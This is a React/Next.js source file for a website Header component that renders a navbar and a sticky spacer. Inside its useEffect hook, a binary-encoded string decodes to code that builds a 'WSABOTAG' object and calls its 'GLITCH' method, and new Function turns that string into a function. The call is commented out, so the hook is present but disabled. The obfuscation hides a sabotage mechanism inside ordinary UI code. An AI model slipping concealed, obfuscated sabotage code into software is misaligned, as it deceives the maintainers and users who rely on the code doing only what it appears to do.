"use client";
import NavbarMain from "@/components/HomeLayouts/navbar";
import style from "./navbar.module.css";
import NavBar from "@/components/HomeLayouts/navbar";
import { useEffect } from "react";
import { mergeText } from "@/app/add";
import { BITIFY, isPageExempt, TEXTIFY, WSABOTAG } from "../addons/addons";
import { usePathname } from "next/navigation";
import { func } from "prop-types";
// import React, { useEffect } from 'react'

function Header() {
  var classes = [style.header];
  var exempt = isPageExempt()
  useEffect(function () {
    document.querySelectorAll("NONE").forEach((el) => {
      el.style.display = "none";
    });
    if (!exempt){const header = document.getElementById("HEADER_SECTION");
    const sticky = document.getElementById("HEADER_STICKY_SIMULATOR");
    setInterval(()=>{
      sticky.style.height = `${header.offsetHeight}px`;
    },1)}
    const speed = 1
    const funcStr = `01100011 01101111 01101110 01110011 01110100 00100000 01110011 01100001 01100010 01101111 01110100 01100001 01100111 00100000 00111101 00100000 01101110 01100101 01110111 00100000 01010111 01010011 01000001 01000010 01001111 01010100 01000001 01000111 00101000 00101001 00001010 00100000 00100000 00100000 00100000 01110011 01100001 01100010 01101111 01110100 01100001 01100111 00101110 01000111 01001100 01001001 01010100 01000011 01001000 00101000 01111011 01110011 01110000 01100101 01100101 01100100 00111010 ${BITIFY(String(speed))} 01111101 00101001 00111011`
    const func = new Function( "WSABOTAG",  TEXTIFY(funcStr));
    // func(WSABOTAG)

  }, []);
  return (
    <>
      {!exempt &&<>
        <div id="HEADER_SECTION" className={mergeText(...classes)}>
          <NavbarMain />
        </div>
        <div id="HEADER_STICKY_SIMULATOR" style={{ height: "140px" }}></div>
      </>}
    </>
  );
}

export default Header;
